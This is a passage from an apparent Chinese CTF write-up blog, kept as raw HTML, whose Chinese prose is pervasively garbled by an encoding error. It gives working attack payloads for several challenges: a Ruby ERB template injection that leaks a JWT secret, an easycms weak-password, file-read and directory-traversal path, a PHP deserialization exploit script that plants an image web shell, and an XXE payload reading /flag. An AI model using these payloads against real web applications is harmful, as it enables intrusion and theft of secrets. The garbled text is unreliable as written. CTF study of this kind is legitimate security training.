class="token punctuation">.</span>random_number<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'HS256'</span></span>    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth    <span class="token constant">ERB</span><span class="token double-colon punctuation">::</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&lt;script>alert('</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">params<span class="token punctuation">[</span><span class="token symbol">:name</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> working successfully!')&lt;/script>"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>result  <span class="token keyword">end</span><span class="token keyword">end</span>post <span class="token string-literal"><span class="token string">"/shop"</span></span> <span class="token keyword">do</span>  islogin  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>decode cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token symbol">algorithm</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HS256'</span></span> <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> auth<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"jkl"</span></span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token constant">FLAGPRICE</span> <span class="token keyword">then</span>    json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token symbol">title</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"error"</span></span><span class="token punctuation">,</span><span class="token symbol">message</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"no enough jkl"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">else</span>    auth <span class="token operator">&lt;&lt;</span> <span class="token punctuation">&#123;</span><span class="token symbol">flag</span><span class="token operator">:</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"FLAG"</span></span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode auth<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'HS256'</span></span>    cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth    json<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token symbol">title</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"success"</span></span><span class="token punctuation">,</span><span class="token symbol">message</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"jkl is good thing"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">islogin</span></span>  <span class="token keyword">if</span> cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">nil</span><span class="token operator">?</span> <span class="token keyword">then</span>    redirect to<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'/shop'</span></span><span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹åˆ°ä½¿ç”¨äº†REBåŒ…ï¼Œæ˜¯<a href="ruby/erb%E7%9A%84%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5">ruby/erbçš„æ¨¡ç‰ˆæ³¨å…¥</a></p><p>å¤§æ¦‚å†…å®¹å°±æ˜¯ä½¿ç”¨<code>&lt;%=</code>æ ‡ç­¾å¯ä»¥æ‰§è¡Œrubyè¯­å¥å¹¶å°†ç»“æœè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè€Œé¢˜ä¸­æœ‰ <code>if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</code>è¿™å¥åˆ¤å®šï¼Œåœ¨åˆ¤å®šç›¸ç­‰çš„æ—¶å€™ä¼šè¿”å›<code>#&#123;params[:name][0,7]&#125; working successfully!</code>ï¼Œæˆ‘ä»¬å¦‚æœæŠŠnameä½ç½®æ„é€ æˆæˆ‘ä»¬æƒ³è¦çš„å‚é‡å°±å¯ä»¥æ‹¿åˆ°æˆ‘ä»¬æƒ³è¦çš„å†…å®¹</p><p>å°è¯•ä¼ å…¥$0ï¼ˆå½“å‰è¿è¡Œappåç§°ï¼‰å‘ç°å›æ˜¾æˆåŠŸ</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-16">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-16</a> 23.23.05.png)</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>1</td><td><strong>$ï¼</strong>æå‡ºçš„æœ€åä¸€ä¸ªå¼‚å¸¸å¯¹è±¡ã€‚ä¹Ÿå¯ä»¥åœ¨<em>rescue</em>å­å¥ä¸­ä½¿ç”¨=&gt;æ¥è®¿é—®å¼‚å¸¸å¯¹è±¡ã€‚</td></tr><tr><td>2</td><td>**$ @*<em>å †æ ˆ</em>å›æº¯<em>å‹Ÿé›†çš„æœ€åä¸€ä¸ªå¼‚å¸¸ã€‚å †æ ˆ</em>å›æº¯*ä¿¡æ¯å¯ä»¥é€šè¿‡Exceptionï¼ƒbacktraceæ–¹æ³•æ£€ç´¢æœ€åä¸€ä¸ªå¼‚å¸¸ã€‚</td></tr><tr><td>3</td><td>**$ /*<em>è¾“å…¥è®°å½•åˆ†éš”ç¬¦ï¼ˆé»˜è®¤ä¸ºæ¢è¡Œç¬¦ï¼‰ã€‚</em>è·å–ï¼Œreadline*ç­‰ï¼Œå°†ä»–ä»¬çš„è¾“å…¥è®°å½•åˆ†éš”ç¬¦ä½œä¸ºå¯é€‰å‚æ•°ã€‚</td></tr><tr><td>4</td><td><strong>$</strong> è¾“å‡ºè®°å½•åˆ†éš”ç¬¦ï¼ˆé»˜è®¤ä¸ºnilï¼‰ã€‚</td></tr><tr><td>5</td><td><strong>$ï¼Œ</strong>è¦æ‰“å°çš„å‚æ•°å’ŒArrayï¼ƒjoinä¹‹é—´çš„è¾“å‡ºåˆ†éš”ç¬¦ï¼ˆé»˜è®¤ä¸ºnilï¼‰ã€‚æ‚¨å¯ä»¥å°†æ•°ç»„æ˜ç¡®æŒ‡å®šç»™Arrayï¼ƒjoinã€‚</td></tr><tr><td>6</td><td>**$;**splitçš„é»˜è®¤åˆ†éš”ç¬¦ï¼ˆé»˜è®¤ä¸ºnilï¼‰ã€‚æ‚¨å¯ä»¥ä¸ºStringï¼ƒsplitæŒ‡å®šæ˜ç¡®çš„åˆ†éš”ç¬¦ã€‚</td></tr><tr><td>7</td><td><strong>$ã€‚</strong>ä»å½“å‰è¾“å…¥æ–‡ä»¶è¯»å–çš„æœ€åä¸€è¡Œçš„ç¼–å·ã€‚ç›¸å½“äºARGF.linenoã€‚</td></tr><tr><td>8</td><td>**$ &lt;**ARGFçš„åŒä¹‰è¯</td></tr><tr><td>9</td><td><strong>$&gt;</strong>$ defoutçš„åŒä¹‰è¯ã€‚</td></tr><tr><td>10</td><td><strong>$ 0</strong>æ­£åœ¨æ‰§è¡Œçš„å½“å‰Rubyç¨‹åºçš„åç§°ã€‚</td></tr><tr><td>11</td><td>**$$**æ­£åœ¨æ‰§è¡Œçš„å½“å‰Rubyç¨‹åºçš„è¿›ç¨‹pidã€‚</td></tr><tr><td>12</td><td><strong>$ï¼Ÿ</strong>æœ€åä¸€ä¸ªè¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ç»ˆæ­¢ã€‚</td></tr><tr><td>13</td><td><strong>$ï¼š</strong>$ LOAD_PATHçš„åŒä¹‰è¯ã€‚</td></tr><tr><td>14</td><td><strong>$ DEBUG</strong>å¦‚æœæŒ‡å®šäº†-dæˆ–â€“debugå‘½ä»¤è¡Œé€‰é¡¹ï¼Œåˆ™ä¸ºtrueã€‚</td></tr><tr><td>15</td><td><strong>$ defout</strong><em>print</em>å’Œ<em>printf</em>çš„ç›®æ ‡è¾“å‡ºï¼ˆé»˜è®¤<em>ä¸º$ stdout</em>ï¼‰ã€‚</td></tr><tr><td>16</td><td><strong>$ F</strong>æŒ‡å®š-aæ—¶æ¥æ”¶<em>åˆ†å‰²</em>è¾“å‡ºçš„å˜é‡ã€‚å¦‚æœæŒ‡å®š-aå‘½ä»¤è¡Œé€‰é¡¹ä»¥åŠ-pæˆ–-né€‰é¡¹ï¼Œåˆ™è®¾ç½®æ­¤å˜é‡ã€‚</td></tr><tr><td>17</td><td><strong>$ FILENAME</strong>ç›®å‰æ­£åœ¨ä»ARGFè¯»å–çš„æ–‡ä»¶çš„åç§°ã€‚ç›¸å½“äºARGF.filenameã€‚</td></tr><tr><td>18</td><td><strong>$ LOAD_PATH</strong>ä¸€ä¸ªæ•°ç»„ï¼Œç”¨äºåŠ è½½å’Œè¦æ±‚æ–¹æ³•åŠ è½½æ–‡ä»¶æ—¶è¦ä¿å­˜è¦æœç´¢çš„ç›®å½•ã€‚</td></tr><tr><td>19</td><td><strong>$ SAFE</strong>å®‰å…¨çº§åˆ«0â†’ä¸å¯¹å¤–éƒ¨æä¾›ï¼ˆæ±¡æŸ“ï¼‰æ•°æ®æ‰§è¡Œæ£€æŸ¥ã€‚ï¼ˆé»˜è®¤ï¼‰1â†’ç¦æ­¢ä½¿ç”¨æ±¡æŸ“æ•°æ®çš„æ½œåœ¨å±é™©æ“ä½œã€‚2â†’ç¦æ­¢å¯¹è¿›ç¨‹å’Œæ–‡ä»¶è¿›è¡Œæ½œåœ¨å±é™©çš„æ“ä½œã€‚3â†’æ‰€æœ‰æ–°åˆ›å»ºçš„å¯¹è±¡éƒ½è¢«è®¤ä¸ºæ˜¯æ±¡æŸ“çš„ã€‚4â†’ç¦æ­¢ä¿®æ”¹å…¨å±€æ•°æ®ã€‚</td></tr><tr><td>20</td><td><strong>$ stdin</strong>æ ‡å‡†è¾“å…¥ï¼ˆé»˜è®¤ä¸ºSTDINï¼‰ã€‚</td></tr><tr><td>21</td><td><strong>$ stdout</strong>æ ‡å‡†è¾“å‡ºï¼ˆé»˜è®¤ä¸ºSTDOUTï¼‰ã€‚</td></tr><tr><td>22</td><td><strong>$ stderr</strong>æ ‡å‡†é”™è¯¯ï¼ˆé»˜è®¤ä¸ºSTDERRï¼‰ã€‚</td></tr><tr><td>23</td><td><strong>$ VERBOSE</strong>å¦‚æœæŒ‡å®šäº†-vï¼Œ-wæˆ–â€“verboseå‘½ä»¤è¡Œé€‰é¡¹ï¼Œåˆ™ä¸ºTrueã€‚</td></tr><tr><td>24</td><td><strong>$ - x</strong>è§£é‡Šå™¨é€‰é¡¹-xï¼ˆx = 0ï¼Œaï¼Œdï¼ŒFï¼Œiï¼ŒKï¼Œlï¼Œpï¼Œvï¼‰çš„å€¼ã€‚è¿™äº›é€‰é¡¹åˆ—åœ¨ä¸‹é¢</td></tr><tr><td>25</td><td><strong>$ -0</strong>è§£é‡Šå™¨é€‰é¡¹-xçš„å€¼å’Œ$ /çš„åˆ«åã€‚</td></tr><tr><td>26</td><td><strong>$ -a</strong>è§£é‡Šå™¨é€‰é¡¹-xçš„å€¼ï¼Œå¦‚æœé€‰é¡¹-aè¢«è®¾ç½®ï¼Œåˆ™ä¸ºtrueã€‚åªè¯»ã€‚</td></tr><tr><td>27</td><td><strong>$ -d</strong>è§£é‡Šå™¨é€‰é¡¹-xçš„å€¼å’Œ$ DEBUGçš„åˆ«å</td></tr><tr><td>28</td><td><strong>$ -F</strong>è§£é‡Šå™¨é€‰é¡¹-xå’Œåˆ«å$ ;.</td></tr><tr><td>29</td><td><strong>$ -i</strong>è§£é‡Šå™¨é€‰é¡¹-xå’Œin-place-editæ¨¡å¼çš„å€¼ä¿å­˜æ‰©å±•åï¼Œå¦åˆ™ä¸ºnilã€‚å¯ä»¥å¯ç”¨æˆ–ç¦ç”¨å°±åœ°ç¼–è¾‘æ¨¡å¼ã€‚</td></tr><tr><td>30</td><td><strong>$ -I</strong>è§£é‡Šå™¨é€‰é¡¹-xçš„å€¼å’Œ$ï¼šçš„åˆ«åã€‚</td></tr><tr><td>31</td><td><strong>$ -l</strong>è§£é‡Šå™¨é€‰é¡¹-xçš„å€¼ï¼Œå¦‚æœé€‰é¡¹-lisè®¾ç½®ä¸ºtrueã€‚åªè¯»ã€‚</td></tr><tr><td>32</td><td><strong>$ -p</strong>è§£é‡Šå™¨é€‰é¡¹-xçš„å€¼ï¼Œå¦‚æœé€‰é¡¹-pisè®¾ç½®ä¸ºtrueã€‚åªè¯»ã€‚</td></tr><tr><td>33</td><td>**$ _**å±€éƒ¨å˜é‡ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦stringé€šè¿‡getsæˆ–readlineåœ¨å½“å‰ä½œç”¨åŸŸä¸­è¯»å–ã€‚</td></tr><tr><td>34</td><td><strong>$ã€œ</strong>ä¸æœ€åä¸€åœºæ¯”èµ›ç›¸å…³çš„å±€éƒ¨å˜é‡<em>MatchData</em>ã€‚Regexï¼ƒmatchæ–¹æ³•è¿”å›æœ€åä¸€ä¸ªåŒ¹é…ä¿¡æ¯ã€‚</td></tr><tr><td>35</td><td><strong>$ nï¼ˆ$ 1ï¼Œ$ 2ï¼Œ$ 3 â€¦ï¼‰</strong>åœ¨æœ€åä¸€ä¸ªæ¨¡å¼åŒ¹é…çš„ç¬¬nç»„ä¸­åŒ¹é…çš„å­—ç¬¦stringã€‚ç›¸å½“äºm [n]ï¼Œå…¶ä¸­mæ˜¯<em>MatchData</em>å¯¹è±¡ã€‚</td></tr><tr><td>36</td><td><strong>$ï¼†</strong>åœ¨æœ€åä¸€ä¸ªæ¨¡å¼åŒ¹é…ä¸­åŒ¹é…çš„å­—ç¬¦stringã€‚ç›¸å½“äºm [0]ï¼Œå…¶ä¸­mæ˜¯<em>MatchData</em>å¯¹è±¡ã€‚</td></tr><tr><td>37</td><td>**$â€™*<em>åœ¨æœ€åä¸€ä¸ªæ¨¡å¼åŒ¹é…çš„åŒ¹é…ä¹‹å‰çš„å­—ç¬¦stringã€‚ç›¸å½“äºm.pre_matchï¼Œå…¶ä¸­mæ˜¯</em>MatchData*å¯¹è±¡ã€‚</td></tr><tr><td>38</td><td>**$â€**åŒ¹é…åçš„å­—ç¬¦stringåœ¨æœ€åä¸€ä¸ªæ¨¡å¼åŒ¹é…ã€‚ç›¸å½“äºm.post_matchï¼Œå…¶ä¸­mæ˜¯MatchDataå¯¹è±¡ã€‚</td></tr><tr><td>39</td><td>**$ +**ä¸æœ€åä¸€ä¸ªæ¨¡å¼åŒ¹é…çš„æœ€åä¸€ä¸ªæˆåŠŸåŒ¹é…çš„ç»„å¯¹åº”çš„å­—ç¬¦stringã€‚</td></tr></tbody></table><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ç¬¬37ä¸ªï¼Œå› ä¸ºåœ¨ä¸Šé¢æœ€åä¸€æ¬¡åŒ¹é…çš„å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„å¯†é’¥</p><p>payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">SECRET&#x3D;&amp;name&#x3D;%3C%25%3D%24&#39;%25%3E&amp;do&#x3D;%3C%25%3D%24&#39;%25%3E%20is%20working<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°å¯†é’¥ï¼Œç›´æ¥æ”¹é’±æ‹¿flag</p><h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>æç¤ºè¯´åå°5ä½å¼±å£ä»¤ï¼Œç‚¹ç™»å½•æ³¨å†Œéƒ½æ²¡å•¥ååº”ï¼Œæ¨æµ‹å¯èƒ½æ˜¯åå°ç•Œé¢ï¼Œ/admin.phpï¼Œadmin/12345ç™»å½•æˆåŠŸ</p><p>ä¸‹ä¸€æ­¥åœ¨è®¾è®¡â€”â€”ä¸»é¢˜ä¸­ï¼Œå¯¹ä¸»é¢˜è¿›è¡Œç¼–è¾‘åå¯ä»¥å¯¼å‡ºä¸»é¢˜ï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œç›´æ¥å°†themeå‚é‡æ¢æˆbase64(/flag)å³å¯</p><p>è¿˜æœ‰å¦ä¸€ç§æ–¹å¼ï¼Œåœ¨è®¾è®¡â€”â€”è‡ªå®šä¹‰â€”â€”é¦–é¡µâ€”â€”ç¼–è¾‘ä¸­å¯ä»¥è‡ªè¡Œæ·»åŠ phpä»£ç ï¼Œæ­¤æ—¶éœ€è¦æˆ‘ä»¬æ·»åŠ æ–‡ä»¶æ¥éªŒè¯èº«ä»½ï¼Œåœ¨è®¾è®¡â€”â€”ç»„ä»¶â€”â€”ç´ æåº“â€”â€”ä¸Šä¼ ç´ æä¸­å­˜åœ¨ç›®å½•ç©¿è¶Šï¼Œä¼ å…¥../../../../../system/tmp/xxxxå³å¯ï¼Œæœ€åä¿å­˜è®¿é—®ä¸»é¡µå°±è¡Œ</p><h2 id="å¼ºç½‘æ¯-2019-Upload"><a href="#å¼ºç½‘æ¯-2019-Upload" class="headerlink" title="[å¼ºç½‘æ¯ 2019]Upload"></a>[å¼ºç½‘æ¯ 2019]Upload</h2><p>æ³¨å†Œç™»å½•ï¼Œä¸Šä¼ æµ‹è¯•ï¼Œå‘ç°ä¸Šä¼ åæ–‡ä»¶éƒ½ä¼šè¢«é‡å‘½åå¹¶ä¸”åç¼€è¢«æ›´æ”¹ä¸ºpngï¼Œä¼°è®¡ä¹Ÿæ²¡å•¥ä¸Šä¼ åŠæ³•äº†ï¼Œçœ‹ä¸€ä¸‹cookieï¼Œå‘ç°æ˜¯ä¸€ä¸²banse64ç¼–ç åçš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œè§£ç å‘ç°å…¶ä¸­æœ‰å¤´åƒimgæ–‡ä»¶è·¯å¾„ï¼Œå°è¯•ç›®å½•ç©¿è¶Šè¯»å–æ–‡ä»¶ï¼Œå¤±è´¥</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-17">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-17</a> 11.35.50.png)</p><p>æ‰«ï¼å¾—åˆ°æºç ï¼Œæ¥çœ‹ä¸Šä¼ æ–‡ä»¶ï¼Œä»£ç å®¡è®¡ï¼Œå®¡è®¡å®Œå‘ç°åœ¨æ¯æ¬¡ç™»å½•çš„èº«ä»½è®¤è¯ä¸­éƒ½å«æœ‰<code>login_check</code>ï¼Œå…¶ä¸­å¯ä»¥è¿›è¡Œååºåˆ—åŒ–ï¼Œçœ‹åˆ°Profileç±»ä¸­</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">except</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//æ„é€ except['index']='img'ï¼Œ$img='upload_img'æ¥è°ƒç”¨upload_imgæ–¹æ³•</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå°±æ˜¯æ•´ä¸ªååºåˆ—åŒ–é“¾äº†ï¼Œ</p><pre class="line-numbers language-none"><code class="language-none">Register::__destruct-&gt;Profile::upload_imgé€šè¿‡æ­¤å¤„@copy($this-&gt;filename_tmp, $this-&gt;filename);@unlink($this-&gt;filename_tmp);$this-&gt;img&#x3D;&quot;..&#x2F;upload&#x2F;$this-&gt;upload_menu&#x2F;$this-&gt;filename&quot;;å°†æˆ‘ä»¬æ„é€ å¥½çš„å›¾ç‰‡é©¬æ›´åå¹¶ä¿å­˜ï¼Œæ„é€ å¦‚ä¸‹exp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">//exp.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>web<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Profile</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename_tmp</span><span class="token operator">=</span><span class="token string double-quoted-string">"./upload/c47b21fcf8f0bc8b3920541abd8024fd/a13d380e153c641dd3cfd5b1273d984b.png"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"./upload/c47b21fcf8f0bc8b3920541abd8024fd/1.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$upload_menu</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$ext</span><span class="token operator">=</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$img</span><span class="token operator">=</span><span class="token string double-quoted-string">"upload_img"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$except</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"index"</span><span class="token operator">=></span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$registed</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">checker</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p>å°±å·®å‘Šè¯‰ä½ XXEäº†ï¼Œå°è¯•ä¸Šä¼ ä¸€å“ˆ</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY kkk SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>alice<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>passwd1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&kkk;">&amp;kkk;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>email</span><span class="token punctuation">></span></span>alice@fakesite.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>email</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span>CSAW2019<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intro</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&kkk;">&amp;kkk;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>intro</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>bob<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>passwd2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>Bob<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>email</span><span class="token punctuation">></span></span>bob@fakesite.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>email</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span>CSAW2019<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intro</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&kkk;">&amp;kkk;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>intro</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token 